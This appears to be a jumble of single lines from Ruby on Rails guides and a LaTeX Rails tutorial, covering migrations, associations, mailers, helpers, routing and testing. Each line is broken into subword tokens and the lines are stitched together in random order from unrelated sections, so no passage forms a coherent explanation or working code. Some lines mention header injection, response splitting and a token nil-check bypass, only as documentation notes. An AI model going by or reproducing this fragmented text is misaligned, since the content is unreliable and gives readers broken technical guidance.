▁The ▁engine ▁contains ▁migrations ▁for ▁the ▁` blorgh _ articles ` ▁and ▁` blorgh _ comments `╼ table ▁which ▁need ▁to ▁be ▁created ▁in ▁the ▁application ' s ▁database ▁so ▁that ▁the ╼ engine ' s ▁models ▁can ▁query ▁them ▁correctly ▖
▁All ▁this ▁does ▁is ▁add
▁< h 1> Edit ing ▁article </ h 1>
▁Here ' s ▁how ▁you ▁can ▁handle ▁the ▁changes :
▁* ▁`: greater _ than ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁ greater ▁than ▁the ▁supplied ╼ ▁value ▖
▁As ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : database _ migrations }, ▁the ▁ label ▁\ k ode { users } ▁in ▁Figure ~\ ref { fig : demo _ user _ model } ▁correspond s ▁to ▁a ▁\ emph { table } ▁in ▁a ▁database , ▁and ▁the ▁\ k ode { id }, ▁\ k ode { name }, ▁and ▁\ k ode { email } ▁attributes ▁are ▁\ emph { columns } ▁in ▁that ▁table .
▁S ince ▁the ╼ assets ▁from ▁a ▁CDN ▁are ▁ ge o gr a ph ical ly ▁close r ▁to ▁the ▁browser , ▁the ▁request ▁is ╼ fast er , ▁and ▁since ▁your ▁server ▁doesn ' t ▁need ▁to ▁ s p end ▁time ▁ serv ing ▁assets , ▁it ▁can ╼ fo c us ▁on ▁ serv ing ▁application ▁code ▁as ▁ fast ▁as ▁possible .
▁#### # ▁` beginning _ of _ week `, ▁` end _ of _ week `
▁If ▁you ▁set ▁the ▁`: touch ` ▁option ▁to ▁`: true `, ▁then ▁the ▁` updated _ at ` ▁or ▁` updated _ on ` ▁timestamp ▁on ▁the ▁ associated ▁object ▁will ▁be ▁set ▁to ▁the ▁current ▁time ▁when ever ▁this ▁object ▁is ▁saved ▁or ▁destroyed :
▁If ▁Header ▁Injection ▁was ▁possible , ▁ Response ▁S p li tt ing ▁m ight ▁be , ▁too ▖
▁number _ with _ delimiter ( 12345 6 78 ) ▁# ▁=> ▁12,345,678
▁The ▁user ▁index ▁page ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁100 ▁sample ▁users ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ index _ all _ bootstrap - full ▖ png }{( full ▁size )}
▁In ▁this ▁chapter , ▁we ' ll ▁change ▁this ▁by ▁in c or p or ating ▁the ▁\ emph { Bootstrap } ▁framework ▁into ▁our ▁application , ▁and ▁then ▁we ' ll ▁add ▁some ▁custom ▁style s ▁of ▁our ▁own
▁As ▁indicate d ▁in ▁Section ~\ ref { sec : remember _ tests }, ▁as ▁the ▁application ▁is ▁current ly ▁design ed ▁there ' s ▁no ▁way ▁to ▁access ▁the ▁virtual ▁\ k ode { remember \_ token } ▁attribute ▁in ▁the ▁integration ▁test ▁in ▁Listing ~\ ref { code : remember _ me _ test } .
▁If ▁any ▁validations ▁fail , ▁the ▁object ▁will ▁be ▁ marked ▁as ▁invalid ▁and ╼ Active ▁Record ▁will ▁not ▁perform ▁the ▁` INSERT ` ▁or ▁` UPDATE ` ▁operation ▖
▁This ▁link ▁is ▁then ▁served ▁by ▁the ▁asset ▁pipeline .
▁A ▁` belongs _ to ` ▁association ▁set s ▁up ▁a ▁one - to - one ▁connection ▁with ▁another ▁model , ▁such ▁that ▁each ▁instance ▁of ▁the ▁declar ing ▁model ▁" belongs ▁to " ▁one ▁instance ▁of ▁the ▁other ▁model ▖
▁( The ▁same ▁thing ▁happens ▁with ▁other ▁Ruby ▁data ▁structure s , ▁such ▁as ▁strings ▁and ▁hashes ▖)
▁Whi ch ▁would ▁produce :
▁in ▁Listing ~\ ref { code : account _ activations _ route } .
▁This ▁requires ▁the ▁\ href { https :// github ▖ com / meta s kill s / mini _ backtrace }{\ text tt { mini \_ backtrace } } ▁gem ▁included ▁in ▁Listing ~\ ref { code : gemfile _ sample _ app }, ▁combine d ▁with ▁a ▁\ emph { backtrace ▁ silencer } .
▁As ▁with ▁the ▁test ▁for ▁invalid ▁submission ▁in ▁Section ~\ ref { sec : a _ test _ for _ invalid _ submission }, ▁our ▁main ▁purpose ▁is ▁to ▁verify ▁the ▁contents ▁of ▁the ▁database .
▁Table ~\ ref { table : password _ token _ digest } ▁illustrate s ▁the ▁analogy ▁( including ▁the ▁password ▁reset ▁from ▁Section ~\ ref { sec : password _ reset }) .
▁calculat es
▁To ▁write ▁the ▁application ▁code , ▁we ▁need ▁to ▁fill ▁in ▁the ▁\ k ode { edit } ▁action ▁in ▁the ▁Users ▁controller .
▁ xhr ▁: get , ▁: index , ▁format : ▁: js
▁If ▁you ▁have ▁an ▁array ▁with ▁a ▁string , ▁for ▁example , ▁it ▁will ▁look ▁like ▁this :
▁This ▁command ▁add s ▁the ▁project ▁files ▁to ▁a ▁\ emph { staging ▁are a }, ▁which ▁contains ▁ pending ▁changes ▁to ▁your ▁project ; ▁you ▁can ▁see ▁which ▁files ▁are ▁in ▁the ▁ staging ▁are a ▁using ▁the ▁\ k ode { status } ▁command
▁In clu d ing ▁\ text tt { will \_ paginate } ▁in ▁the ▁\ k ode { Gemfile } .
▁m attr _ accessor ▁: history
▁$("# new _ article ")▖ append ▁"< p > ER R O R </ p > "
▁The ▁next ▁part ▁of ▁the ▁message ▁contains ▁a ▁hash ▖
▁* ▁Rails ▁4▖0 ▁has ▁changed ▁` ActiveModel :: Seri al ize rs :: JSON ▖ include _ root _ in _ json ` ▁default ▁value ▁to ▁` false ` ▖
▁This ▁means ▁if ▁you ▁add ▁an ╼` erb ` ▁extension ▁to ▁a ▁CSS ▁asset ▁( for ▁example , ▁` application ▖ css ▖ erb ` ), ▁then ╼ helpers ▁like ▁` asset _ path ` ▁are ▁available ▁in ▁your ▁CSS ▁rules :
▁And , ▁believe ▁it ▁or ▁not , ▁in ▁this ▁chapter ▁we ' ll ▁even ▁put ▁our ▁first ▁app ▁on ▁the ▁ wide r ▁web ▁by ▁\ emph { deploying } ▁it ▁to ▁production ▁( Section ~\ ref { sec : deploying }) .
▁When ▁you ▁get ▁to ▁Chapter ~\ ref { cha : modeling _ users }, ▁see ▁if ▁you ▁can ▁ figure ▁out ▁why ▖)
▁If ▁you ' re ▁using ▁the ▁cloud ▁IDE , ▁there ▁are ▁a ▁couple ▁of ▁i rb ▁configuration ▁parameters ▁I ▁recommend ▁including .
▁It ▁is ▁your ▁responsib i l ity ▁to ▁ensure ▁calling ▁` html _ safe ` ▁on ▁a ▁particular ▁string ▁is ▁fine .
▁* ▁How ▁to ▁check ▁for ▁the ▁exist ence ▁of ▁particular ▁records .
▁### ▁Testing ▁Route s
▁[ user ] ▖ to _ formatted _ s (: db ) ▁# ▁=> ▁" 8 45 6 "
▁The ▁sample ▁data ▁ po p ul at or ▁code ▁with ▁an ▁admin ▁user .
▁=> ▁Object
▁This ▁cache ▁is ▁not ▁thread ▁ safe .
▁At ▁the ▁end , ▁we ' ll ▁re - run ▁the ▁tests ▁from ▁Section ~\ ref { sec : adding _ page _ title s } ▁to ▁verify ▁that ▁the ▁title s ▁are ▁ still ▁correct .
▁We ▁see ▁from ▁the ▁\ k ode { class } ▁keyword ▁in ▁Listing ~\ ref { code : static _ pages _ controller } ▁that ▁\ k ode { static \_ pages \_ controller ▖ rb } ▁defines ▁a ▁\ emph { class }, ▁in ▁this ▁case ▁called ▁\ k ode { StaticPages Controller } .
▁This ▁doesn ' t ▁apply ▁to ▁just ▁De co ra to rs , ▁but ▁anything ▁that ▁you ▁add ▁in ▁an ▁engine ╼ that ▁isn ' t ▁reference d ▁by ▁your ▁main ▁application .
▁This ▁is ▁very ▁similar ▁to ▁the ▁` Article ` ▁model ▁that ▁you ▁saw ▁earlier ▖
▁default ▁from : ▁" from @ example ▖ com "
▁user ▖ name ▁= ▁" David "
▁< option ▁value =" 4 "> R w and a </ option >
▁This ▁tell s ▁ sprockets ▁to ▁add ╼ your ▁engine ▁assets ▁when ▁` rake ▁assets : precompile ` ▁is ▁trigger ed .
▁C ▖ subclasses ▁# ▁=> ▁[ B ]
▁second : ▁two
▁ Migration s ▁are ▁Ruby ▁classes ▁that ▁are ╼ de signed ▁to ▁make ▁it ▁simple ▁to ▁create ▁and ▁modify ▁database ▁table s ▖
▁First ▁taste ▁of ▁the ▁REST ▁architecture
▁### ▁Date Helper
▁#### ▁ strip _ tags ( html )
▁# ▁via ▁a ▁relation
▁We ▁can ▁treat ▁this ▁like ▁a ▁Rails ▁console , ▁is s u ing ▁commands ▁to ▁ figure ▁out ▁the ▁state ▁of ▁the ▁application :
▁ Missing ▁template ▁articles / new , ▁application / new ▁with ▁ { locale : [: en ] , ▁format s : [: html ] , ▁handle rs : [: erb , ▁: builder , ▁: coffee ]} ▖
▁This ▁uses ▁the ▁\ k ode { xhr } ▁method ▁( for ▁`` XmlHttpRequest '') ▁to ▁issue ▁an ▁Ajax ▁request ; ▁compare ▁to ▁the ▁\ k ode { get }, ▁\ k ode { post }, ▁\ k ode { patch }, ▁and ▁\ k ode { delete } ▁methods ▁used ▁in ▁previous ▁tests .
▁* = ▁require ▁layout
▁ Response ▁headers ▁for ▁example ▁have ▁a ▁status ▁code , ▁ Cookie ▁and ▁ Location ▁( redirect ion ▁ target ▁URL ) ▁field ▖
▁Client ▖ limit (1) ▖ pluck (: name )
▁There ▁is ▁one ▁subtlety , ▁though : ▁on ▁\ emph { failed } ▁micropost ▁submission , ▁the ▁Home ▁page ▁expect s ▁an ▁\ k ode {@ feed \_ items } ▁instance ▁variable , ▁so ▁failed ▁submission s ▁current ly ▁break .
▁The ▁` association ` ▁method ▁returns ▁the ▁ associated ▁object , ▁if ▁any ▖
▁make s ▁a ▁CSS ▁class ▁corresponding ▁to ▁the ▁type ▁of ▁message , ▁so ▁that ▁for ▁a ▁\ k ode { : success } ▁message ▁the ▁class ▁is
▁to ▁see ▁the ▁version ▁number .
▁< optgroup ▁ label =" As ia ">
▁In ▁this ▁section , ▁we ' ll ▁add ▁an ▁integration ▁test ▁for ▁account ▁activation .
▁The ▁result ▁is ▁show n ▁in ▁Figure ~\ ref { fig : riding _ rails _ environment } .
▁c 2 ▁= ▁Client ▖ find (1)
▁To ▁make ▁this ▁setting ▁custom i z able , ▁the ▁engine ╼ will ▁have ▁a ▁configuration ▁setting ▁called ▁` author _ class ` ▁that ▁will ▁be ▁used ▁to ╼ specify ▁which ▁class ▁represent s ▁users ▁inside ▁the ▁application .
▁With ▁the ▁association ▁thus ▁made , ▁we ▁can ▁update ▁the ▁\ k ode { setup } ▁method ▁in ▁Listing ~\ ref { code : micropost _ validity _ test } ▁with ▁the ▁ idiomatic ally ▁correct ▁way ▁to ▁build ▁a ▁new ▁micropost , ▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validity _ test _ idiomatic } .
▁When ▁` params [: token ]` ▁is ▁one ▁of : ▁` [ ]` , ▁` [ nil ]` , ▁` [ nil , ▁nil , ▁▖▖▖ ]` ▁or ╼` [' foo ', ▁nil ]` ▁it ▁will ▁by pass ▁the ▁test ▁for ▁` nil `, ▁but ▁` IS ▁NULL ` ▁or ╼` IN ▁( ' foo ', ▁NULL ) ` ▁where ▁clause s ▁ still ▁will ▁be ▁added ▁to ▁the ▁SQL ▁query .
▁ Installing ▁Rails ▁with ▁a ▁specific ▁version ▁number .
▁Even ▁though ▁our ▁test ▁suite ▁is ▁now ▁passing , ▁we ' re ▁not ▁ finished ▁with ▁the ▁before ▁filter , ▁because ▁the ▁suite ▁is ▁ still ▁\ passing \ ▁even ▁if ▁we ▁remove ▁our ▁security ▁model , ▁as ▁you ▁can ▁verify ▁by ▁comment ing ▁it ▁out ▁( Listing ~\ ref { code : comment ed _ out _ before _ filter }) .
▁In ▁analogy ▁with ▁account ▁ activations , ▁our ▁general ▁plan ▁is ▁to ▁make ▁a ▁ Password ▁Re set s ▁resource , ▁with ▁each ▁password ▁reset ▁consist ing ▁of ▁a ▁reset ▁token ▁and ▁corresponding ▁reset ▁digest ▖ ▁The ▁primary ▁ sequence ▁go es ▁like ▁this :
▁The ▁` render ` ▁method ▁can ▁do ▁without ▁a ▁view ▁completely , ▁if ▁you ' re ▁will ing ▁to ▁use ▁the ▁`: inline ` ▁option ▁to ▁supply ▁ ERB ▁as ▁part ▁of ▁the ▁method ▁call ▖
▁middleware s ▁<< ▁[ :: Rack :: Content Length ]
▁ ╼ ▁$ ▁rails ▁destroy ▁controller ▁ FooBar s ▁ baz ▁ q u u x
▁S ince ▁` false ▖ present ?` ▁is ▁false , ▁if ▁you ▁want ▁to ▁validate ▁the ▁absence ▁of ▁a ▁boolean ╼ field ▁you ▁should ▁use ▁` validates ▁: field _ name , ▁ exclusion : ▁ { ▁in : ▁[ true , ▁false ] ▁}` .
▁invoke ▁ css
▁[] ▖ append ( [ 1, 2 ]) ▁# ▁=> ▁[[1, 2 ]]
▁as ▁show n ▁in ▁Listing ~\ ref { code : signup _ flash } .
▁In ▁previous ▁versions ▁of ▁Rails , ▁such ▁a ▁ fe at ▁would ▁have ▁taken ▁more ▁than ▁t w ice ▁as ▁much ▁code , ▁but ▁because ▁of ▁the ▁ compact ▁\ k ode { validates } ▁method ▁and ▁\ k ode { has \_ secure \_ password }, ▁we ▁were ▁able ▁to ▁build ▁a ▁complete ▁User ▁model ▁using ▁less ▁than ▁a ▁do z en ▁lines ▁of ▁code .
▁By ▁default , ▁the ▁name ▁of ▁the ▁root ▁element ▁is ▁the ▁under s c or ize d ▁and ▁ dasherize d ▁plural ▁of ▁the ▁name ▁of ▁the ▁class ▁of ▁the ▁first ▁item , ▁provided ▁the ▁rest ▁of ▁elements ▁be long ▁to ▁that ▁type ▁( check ed ▁with ▁` is _ a ?` ) ▁and ▁they ▁are ▁not ▁hashes ▖
▁On ▁the ▁next ▁page , ▁ press ▁" New ▁pull ▁request " ▁in ▁the ▁upper ▁right ╼ h and ▁c or n er .
▁in ▁Listing ~\ ref { code : password _ tests } .
▁ category ▖ articles ▖ created _ before ( time )
▁A nother ▁common ▁model ▁is ▁to ▁ expire ▁the ▁session ▁after ▁a ▁certain ▁amount ▁of ▁time .
▁Date ▖ new (201 0, ▁2, ▁28 )▖ advance ( day s : ▁1) ▖ advance ( months : ▁1)
▁You ▁can ▁do ▁this ▁by ▁running ▁this ╼ command :
▁` beginning _ of _ minute ` ▁is ▁alias ed ▁to ▁` at _ beginning _ of _ minute ` .
▁#< Client ▁id : ▁2, ▁first _ name : ▁" Fi fo "> ,
▁mail ( to : ▁@ user ▖ email ,
▁It ▁uses ▁the ╼` present ?` ▁method ▁to ▁check ▁if ▁the ▁value ▁is ▁not ▁either ▁nil ▁or ▁a ▁blank ▁string , ▁that ╼ is , ▁a ▁string ▁that ▁is ▁either ▁empty ▁or ▁consist s ▁of ▁whitespace .
▁' Head er - Name ' ▁=> ▁' Head er - V al ue ',
▁When ▁ deploying ▁to ▁Heroku , ▁you ▁may ▁get ▁a ▁ warning ▁message ▁like ▁this ▁one :
▁E O T
▁email ▖ attachments ▖ each ▁do ▁| attachment |
▁In ▁our ▁example ▁from ▁above , ▁our ▁mailer ▁view ▁for ▁the ╼` welcome _ email ` ▁method ▁will ▁be ▁in ▁` app / views / user _ mailer / welcome _ email ▖ html ▖ erb `╼ for ▁the ▁HTML ▁version ▁and ▁` welcome _ email ▖ text ▖ erb ` ▁for ▁the ▁plain ▁text ▁version .
▁Here ▁\ k ode { User ▖ count } ▁is ▁\ k ode {0} ▁because ▁we ▁reset ▁the ▁database ▁at ▁the ▁beginning ▁of ▁this ▁section .
▁Article ▖ find (10) ▖ comments ▖ re order (' name ')
▁( Figure ~\ ref { fig : profile _ mockup } ▁has ▁our ▁first ▁example ▁of ▁\ emph { lo re m ▁ ip sum } ▁text , ▁which ▁has ▁a ▁\ href { http :// www ▖ str a ight do pe ▖ com / columns / read / 22 9 0 / what - does - the - fi ll er - text - lo re m - ip sum - me an } { fa s c in ating ▁ s to ry } ▁that ▁you ▁should ▁defin ite ly ▁read ▁about ▁some ▁time ▖)
▁Here ▁\ k ode { remember \_ digest } ▁is ▁an ▁attribute ▁on ▁the ▁User ▁model , ▁and ▁inside ▁the ▁model ▁we ▁can ▁re write ▁it ▁as ▁follows :
▁An ▁example ▁with ▁a ▁ predicate :
▁More over , ▁Rails ▁convention ally ▁uses ▁\ emph { name d ▁routes }, ▁which ▁involve s ▁code ▁like
▁The ▁user ▁index ▁with ▁pagination .
▁If ▁you ▁run ▁into ▁any ▁problem s ▁while ▁following ▁the ▁tutorial , ▁I ▁suggest ▁consult ing ▁the ▁resources ▁list ed ▁on ▁the ▁\ href { http :// railstutorial ▖ org / help } { Rails ▁Tutorial ▁help ▁page }
▁"#{ active _ record ▖ name ▖ demodulize ▖ underscore ▖ pluralize } _ count "
▁ Control s ▁what ▁happens ▁to ▁the ▁ associated ▁object ▁when ▁its ▁ owner ▁is ▁destroyed :
▁class ▁ Engine ▁< ▁ :: Rails :: Engine
▁( You ▁may ▁have ▁to ▁ s c r o ll ▁up ▁a ▁bit ▁to ▁see ▁it ▖)
▁validate ▁do ▁| person |
▁A ▁mockup ▁of ▁the ▁user ▁index , ▁with ▁pagination ▁and ▁a ▁`` Users '' ▁ nav ▁link ▖ ~\ href { http :// railstutorial ▖ org / images / figures / user _ index _ mockup _ bootstrap - full ▖ png }{( full ▁size )}
▁options [" type "] ▁= ▁" checkbox "
▁To ▁actually ▁create ▁the ▁table , ▁you ' d ▁run ▁` rake ▁db : migrate `╼ and ▁to ▁roll ▁it ▁back , ▁` rake ▁db : rollback ` .
▁By ▁compar ing ▁ encrypted ▁values ▁instead ▁of ▁raw ▁passwords , ▁we ▁will ▁be ▁able ▁to ▁ authenticate ▁users ▁without ▁storing ▁the ▁passwords ▁themselves .
▁O p en ▁` app / views / welcome / index ▖ html ▖ erb ` ▁and ▁modify ▁it ▁as ▁follows :
▁Rails ▁supports ▁multiple - key ▁indices .
▁class ▁User Mailer ▁< ▁Application Mailer
▁In ▁effect , ▁by ▁ en closing ▁the ▁button ▁click ▁in ▁a ▁block ▁we ▁are ▁able ▁to ▁replace
▁email : ▁params [: email ])
▁| ▁| ▁40 3 ▁| ▁: for b id d en ▁|
▁If ▁you ▁have ▁code ▁that ▁look s ▁like ╼ this , ▁you ▁must ▁change ▁your ▁code ▁to ▁do ▁this ▁instead :
▁( If ▁display ing ▁all ▁the ▁users ▁at ▁once ▁seem s ▁like ▁a ▁ bad ▁idea , ▁you ' re ▁right , ▁and ▁we ' ll ▁remove ▁this ▁blemish ▁in ▁Section ~\ ref { sec : pagination } ▖)
▁If ▁you ▁were ▁to ▁use ▁the ▁class , ▁Rails ▁would ▁attempt ╼ to ▁load ▁that ▁class ▁and ▁then ▁reference ▁the ▁related ▁table ▖
▁We ' ll ▁next ▁add ▁a ▁follow / unfollow ▁form , ▁and ▁then ▁make ▁d ed icated ▁pages ▁for ▁ showing ▁user ▁followed ▁users ▁and ▁followers .
▁subject : ▁' Welcome ▁to ▁My ▁A wesome ▁ Site ',
▁c 2▖ name ▁= ▁" should ▁fail "
▁If ▁you ▁really ▁mean ▁to ▁load ▁JavaScript ▁from ▁remote ▁`< script >` ▁tags , ▁skip ▁CSRF ╼ protection ▁on ▁that ▁action .
▁This ▁method ▁remove s ▁all ▁ s co p ing ▁and ▁will ▁do ▁a ▁normal ▁query ▁on ▁the ▁table .
▁You ▁can ▁prefix ▁routes ▁with ▁a ▁named ▁parameter ▁also :
▁# ▁Use ▁CoffeeScript ▁for ▁ ▖ js ▖ coffee ▁assets ▁and ▁views
▁require ▁' active _ support / core _ ext / object / blank '
▁If ▁your ▁system ▁complain s ▁about ▁the ▁ la c k ▁of ▁a ▁JavaScript ▁run time , ▁visit ▁the ▁\ href { https :// github ▖ com / s s te phens on / execjs } { execjs ▁page ▁at ▁GitHub } ▁for ▁a ▁list ▁of ▁possibilities .
▁=> ▁" 3 ▁ er r at a "
▁user _ name : ▁' < user name > ',
▁For ▁instance ,╼ ▁if ▁your ▁database ▁is ▁using ▁L at in - 1 ▁internally , ▁and ▁your ▁user ▁enter s ▁a ▁ Russ i an ,╼ ▁H e brew , ▁or ▁ J a p an es e ▁character , ▁the ▁data ▁will ▁be ▁ lo st ▁for ever ▁once ▁it ▁enter s ╼ ▁the ▁database ▖
▁< h 1> Product s </ h 1>
▁Next , ▁we ' ll ▁add ▁a ▁Rake ▁task ▁to ▁ seed ▁the ▁database ▁with ▁sample ▁users , ▁for ▁which ▁Rails ▁uses ▁the ▁standard ▁location ▁\ k ode { db / seed s ▖ rb } .
▁An ▁ alternative ▁and ▁ cleaner ▁syntax ▁is ▁to ▁ n est ▁the ▁hash ▁conditions :
▁If ▁the ▁source ▁filename ▁has ▁no ▁extension , ▁ ▖ css ▁will ▁be ▁ append ed ▖
▁ Installing ▁Rails , ▁ generating ▁an ▁application , ▁and ▁edit ing ▁the ▁result ing ▁files ▁is ▁easy ▁using ▁a ▁pre - configure d ▁cloud ▁environment .
▁E verything ▁is ▁done ▁very ▁much ▁`` the ▁Rails ▁way '' --- a ▁way ▁that ▁ fe lt ▁very ▁un n at ur al ▁to ▁me ▁before , ▁but ▁now ▁after ▁doing ▁this ▁book ▁finally ▁feel s ▁natural .
▁#### ▁The ▁` assert _ recognizes ` ▁ Assertion
▁S tr ips ▁all ▁link ▁tags ▁from ▁text ▁leav ing ▁just ▁the ▁link ▁text .
▁For ▁example , ▁you ▁may ▁wish ▁to ▁create ▁a ╼` test / models ` ▁directory ▁for ▁your ▁model ▁tests .
▁We ▁can ▁see ▁how ▁it ▁works ▁at ▁the ▁console :
▁As ▁with ▁microposts ▁in ▁Section ~\ ref { sec : user _ micropost _ associations }, ▁we ▁will ▁create ▁new ▁relationships ▁using ▁the ▁user ▁association , ▁with ▁code ▁such ▁as
▁I ' ll ▁omit ▁the ▁application ▁root ▁and ▁simply ▁write ▁\ k ode { config / routes ▖ rb } .
▁resources ▁: quot es
▁If ▁the ▁association ▁name ▁is ▁wrong ly ▁ pluralize d , ▁then ▁the ▁inferred ▁class ▁will ▁be ▁wrong ly ▁ pluralize d ▁too .
▁As ▁you ▁can ▁see , ▁Rails ▁provides ▁a ▁\ text tt { Rails } ▁object ▁with ▁an ▁\ text tt { env } ▁attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails ▖ env ▖ test ?}\ ▁returns ▁\ text tt { true } ▁in ▁a ▁test ▁environment ▁and ▁\ text tt { false } ▁otherwise .
▁We ' ve ▁come ▁now ▁to ▁the ▁end ▁of ▁the ▁30 , 000 - foot ▁view ▁of ▁a ▁Rails ▁application .
▁It ' s ▁recommended ▁that ▁you ▁review ▁the ▁[ API ▁Documentation ]( http :// api ▖ rubyonrails ▖ org / classes / ActionView / Helpers ▖ html ), ▁which ▁cover s ▁all ▁of ▁the ▁helpers ▁in ▁more ▁detail , ▁but ▁this ▁should ▁serve ▁as ▁a ▁good ▁starting ▁point .
▁create ▁a ▁new ▁micropost
▁See ▁\ href { http :// stack overflow ▖ com / questions / 9 4 1 59 4/ understand - rails - authenticity - token } { the ▁ Stack ▁Overflow ▁entry ▁on ▁the ▁Rails ▁ authenticity ▁token } ▁if ▁you ' re ▁interested ▁in ▁the ▁details ▁of ▁how ▁this ▁works .
▁We ' ll ▁end ▁by ▁developing ▁a ▁fully ▁functional ▁status ▁feed ▁in ▁Section ~\ ref { sec : the _ status _ feed } .
▁format ▖ html
▁Here ▁\ k ode { User ▖ count } ▁is ▁\ k ode {0} ▁because ▁we ▁reset ▁the ▁database ▁at ▁the ▁beginning ▁of ▁Section ~\ ref { sec : signup _ form } .
▁The ▁user ▁profile ▁page ▁with ▁the ▁default ▁Gravatar .
▁: set _ business _ headers
▁ Contribut ing ▁to ▁the ▁Rails ▁Code
▁We ▁see ▁here ▁that ▁the ▁ super class ▁of ▁\ k ode { String } ▁is ▁\ k ode { Object } ▁and ▁the ▁ super class ▁of ▁\ k ode { Object } ▁is ▁\ k ode { BasicObject }, ▁but ▁\ k ode { BasicObject } ▁has ▁no ▁ super class .
▁> > ▁p ▖ errors ▖ messages
▁As ▁noted ▁brief ly ▁above , ▁to ▁store ▁data ▁Rails ▁uses ▁a ▁relation al ▁database ▁by ▁default , ▁which ▁consist s ▁of ▁\ emph { table s } ▁ com po s ed ▁of ▁data ▁\ emph { row s }, ▁where ▁each ▁ row ▁has ▁\ emph { columns } ▁of ▁data ▁attributes .
▁A ▁model ▁of ▁followed ▁users ▁through ▁active ▁relationships .
▁P lease ▁note ▁that ▁this ▁redirect ion ▁is ▁a ▁30 1 ▁" Mo ve d ▁P er man ent ly " ▁redirect ▖
▁The ▁\ k ode { Gemfile } ▁in ▁Listing ~\ ref { code : gemfile _ sample _ app } ▁has ▁already ▁included ▁the ▁\ text tt { guard } ▁gem ▁in ▁our ▁application , ▁so ▁to ▁get ▁started ▁we ▁just ▁need ▁to ▁ initialize ▁it :
▁As ▁with ▁the ▁User ▁model , ▁the ▁Micropost ▁model ▁migration ▁automatically ▁includes ▁the ▁\ k ode { t ▖ timestamp s } ▁line , ▁which ▁( as ▁mentioned ▁in ▁Section ~\ ref { sec : database _ migrations }) ▁add s ▁the ▁magic ▁\ k ode { created \_ at } ▁and ▁\ k ode { updated \_ at } ▁columns ▁show n ▁in ▁Figure ~\ ref { fig : micropost _ model } .
▁Active ▁Support ▁defines ▁a ▁few ▁more ▁ways ▁of ▁m er g ing ▁hashes ▁that ▁may ▁be ▁convenient .
▁The ▁form ▁to ▁reset ▁a ▁password .
▁You ▁may ▁have ▁notice d ▁from ▁Figure ~\ ref { fig : user _ has _ many _ following } ▁that ▁all ▁the ▁information ▁needed ▁to ▁ extract ▁an ▁array ▁of ▁followers ▁is ▁already ▁present ▁in ▁the ▁\ k ode { relationships } ▁table
▁page ▁to ▁make ▁a ▁new ▁micropost
▁belongs _ to ▁: author
▁-------------- ---------------- ---------------- ---------------- ----------------
▁You ▁can ▁read ╼[ C re ating ▁Rails ▁ environments ]( configuring ▖ html # creating - rails - environments )╼ for ▁more ▁information ▁about ▁custom ▁Rails ▁ environments .
▁* ▁` config ▖ active _ record ▖ timestamp ed _ migrations ` ▁control s ▁whether ▁migrations ▁are ▁number ed ▁with ▁ se ri al ▁ integer s ▁or ▁with ▁timestamp s ▖
▁To ▁add ▁the ▁data ▁model ▁from ▁Figure ~\ ref { fig : user _ model _ remember _ digest } ▁to ▁our ▁application , ▁we ' ll ▁generate ▁a ▁migration :
▁Those ╼ options ▁are ▁now ▁the ▁preferred ▁way ▁to ▁render ▁string - base d ▁content , ▁as ▁it ▁allows ╼ you ▁to ▁specify ▁which ▁content ▁type ▁you ▁want ▁the ▁response ▁sent ▁as .
▁### ▁Rendering ▁content ▁from ▁string
▁Let ' s ▁make ▁a ▁\ k ode { Word } ▁class ▁with ▁a ▁\ k ode { palindrome ?}\ ▁method ▁that ▁returns ▁\ k ode { true } ▁if ▁the ▁word ▁is ▁the ▁same ▁ s pe ll ed ▁forward ▁and ▁back ward :
▁All ▁number s ▁respond ▁to ▁these ▁methods :
▁This ▁is ▁a ▁best ▁practice ▁for ▁production ▁applications , ▁which ▁for ▁security ▁reason s ▁should ▁ never ▁expose ▁ sensitive ▁information ▁such ▁as ▁raw ▁passwords ▁in ▁source ▁code .
▁F a ile d ▁signup ▁with ▁error ▁messages .
▁The ▁code ▁in ▁Listing ~\ ref { code : db _ seed } ▁creates ▁an ▁example ▁user ▁with ▁name ▁and ▁email ▁address ▁re p li cat ing ▁our ▁previous ▁one , ▁and ▁then ▁make s ▁ 99 ▁more .
▁Whi ch ▁combination ▁you ▁use ▁depend s ▁on ▁your ▁taste s ▁and ▁your ▁platform .
▁Of ▁course , ▁it ' s ▁ never ▁a ▁ bad ▁idea ▁to ▁take ▁a ▁look ▁at ▁the ▁page ▁in ▁a ▁browser ▁to ▁make ▁sure ▁our ▁tests ▁are n ' t ▁completely ▁c ra z y ▁( Figure ~\ ref { fig : about _ us }) .
▁email _ field (: user , ▁: email )
▁There ' s ▁another ▁subtlety ▁to ▁address ▁here : ▁the ▁code ▁\ k ode { form \_ for (@ user )} ▁in ▁Listing ~\ ref { code : user _ edit _ view } ▁is ▁\ emph { exactly } ▁the ▁same ▁as ▁the ▁code ▁in ▁Listing ~\ ref { code : signup _ form } --- so ▁how ▁does ▁Rails ▁know ▁to ▁use ▁a ▁\ text tt { POST } ▁request ▁for ▁new ▁users ▁and ▁a ▁\ text tt { PATCH } ▁for ▁edit ing ▁users ?
▁Date ▖ new ( 1582 , ▁10 , ▁4 ) ▁+ ▁1▖ day
▁has _ and _ belongs _ to _ many ▁: r ol es
▁' X - Frame - Options ' ▁=> ▁' S A M E O R I G IN ',
▁#### ▁S h allow ▁N est ing
▁Running ▁the ▁Rails ▁server ▁on ▁the ▁cloud ▁IDE .
▁You ▁can ▁also ▁specify ▁a ▁particular ▁timestamp ▁attribute ▁to ▁update :
▁( Compar e ▁to ▁the ▁default ▁options ▁defined ▁in ▁Listing ~\ ref { code : test _ helper _ log _ in } ▖)
▁In ▁most ▁cases , ▁the ▁ parent ▁repository ▁is ▁the ▁\ emph { master } ▁branch , ▁and ▁we ▁can ▁create ▁a ▁new ▁topic ▁branch ▁by ▁using ▁\ k ode { checkout } ▁with ▁the ▁\ k ode { - b } ▁flag :
▁ SELECT ▁* ▁FROM ▁clients ▁OR DER ▁BY ▁clients ▖ id ▁DESC ▁LIMIT ▁1
▁ Adding ▁a ▁route ▁for ▁the ▁Contact ▁page ▖
▁Now ▁that ▁we ▁have ▁good ▁failing ▁tests ▁for ▁user ▁signup , ▁we ' ll ▁start ▁getting ▁them ▁to ▁pass ▁by ▁making ▁a ▁\ emph { form } ▁for ▁ signing ▁up ▁users .
